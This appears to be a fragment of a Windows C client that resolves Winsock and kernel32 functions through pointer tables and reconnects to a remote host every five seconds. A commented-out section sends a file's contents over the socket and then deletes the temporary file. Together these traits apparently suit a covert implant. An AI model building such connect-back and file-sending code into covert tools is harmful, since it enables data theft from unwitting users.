#include "framework.h"
#include "pch.h"
#include "utils.h"
#include "utils_headers.h"
#include "headers.h"
#include "sleaping.h"
#include <stdlib.h>
#include <stdint.h>

int startup_wsa(winsock_functions_t* ws_funcs)
{
	WSADATA wsa_data;
	int result = 1;
	if ((result = ws_funcs->WSAStartup(MAKEWORD(2, 2), &wsa_data)) != 0)
	{
		return -1;
	}

	return 0;
}

void cleanup_wsa(winsock_functions_t* ws_funcs)
{
	ws_funcs->WSACleanup();
}

int init_connection(const char* hostname, int port, winsock_functions_t* ws_funcs, kernel32_functions_t* core_funcs)
{
	SOCKET client_socket;
	struct sockaddr_in server_addr = { 0 };

	int result = 1;

	while(1)
	{
		client_socket = ws_funcs->Socket(AF_INET, SOCK_STREAM, 0);
		if (client_socket == INVALID_SOCKET)
		{
			return -1;
		}

		server_addr.sin_family = AF_INET;
		server_addr.sin_port = ws_funcs->Htons(port);
		if (ws_funcs->Inet_pton(AF_INET, hostname, &server_addr.sin_addr) <= 0)
		{
			return -1;
		}

		result = ws_funcs->Connect(client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr));

		if (result == SOCKET_ERROR)
		{
			ws_funcs->CloseSocket(client_socket);
			core_funcs->Sleep(5000);
			continue;
		}
		break;
	}

	return 0;

}



//int send_file(const char* filename, SOCKET sock)
//{
//	FILE* fp = NULL;
//	long file_size;
//	char* buffer = NULL;
//	size_t bytes_read;
//	int total_sent = 0;
//	int result;
//
//	// 打开文件
//	fp = fopen(filename, "rb");
//	if (!fp) {
//		//printf("无法打开文件: %s\n", filename);
//		return -1;
//	}
//
//	// 获取文件大小
//	fseek(fp, 0, SEEK_END);
//	file_size = ftell(fp);
//	fseek(fp, 0, SEEK_SET);
//
//	if (file_size <= 0) {
//		//printf("文件为空或无效\n");
//		fclose(fp);
//		return -1;
//	}
//
//	// 分配缓冲区
//	buffer = (char*)malloc(file_size);
//	if (!buffer) {
//		//printf("内存分配失败\n");
//		fclose(fp);
//		return -1;
//	}
//
//	// 读取文件
//	bytes_read = fread(buffer, 1, file_size, fp);
//	if (bytes_read != file_size) {
//		//printf("读取文件不完全\n");
//		free(buffer);
//		fclose(fp);
//		return -1;
//	}
//
//	fclose(fp);
//
//	// 发送文件大小（8字节，大端序）
//	uint64_t size_be = _byteswap_uint64((uint64_t)file_size);
//	result = send(sock, (char*)&size_be, sizeof(size_be), 0);
//	if (result == SOCKET_ERROR) {
//		int error = WSAGetLastError();
//		//printf("发送文件大小失败: %d\n", error);
//		free(buffer);
//		return -1;
//	}
//
//	// 发送文件数据
//	while (total_sent < file_size) {
//		int remaining = file_size - total_sent;
//		int to_send = remaining > 4096 ? 4096 : remaining;
//
//		result = send(sock, buffer + total_sent, to_send, 0);
//		if (result == SOCKET_ERROR) {
//			int error = WSAGetLastError();
//			//printf("发送数据失败: %d\n", error);
//			free(buffer);
//			return -1;
//		}
//
//		total_sent += result;
//	}
//
//	//printf("文件发送完成: %d 字节\n", total_sent);
//	free(buffer);
//	return 0;
//}
//
//int cleanup_temp_file(const char* filename)
//{
//	if (DeleteFileA(filename)) {
//		//printf("临时文件已删除\n");
//		return 0;
//	}
//	else {
//		DWORD error = GetLastError();
//		if (error != ERROR_FILE_NOT_FOUND) {
//			//printf("删除临时文件失败: %s (错误代码: %lu)\n", filename, error);
//		}
//		return -1;
//	}
//}
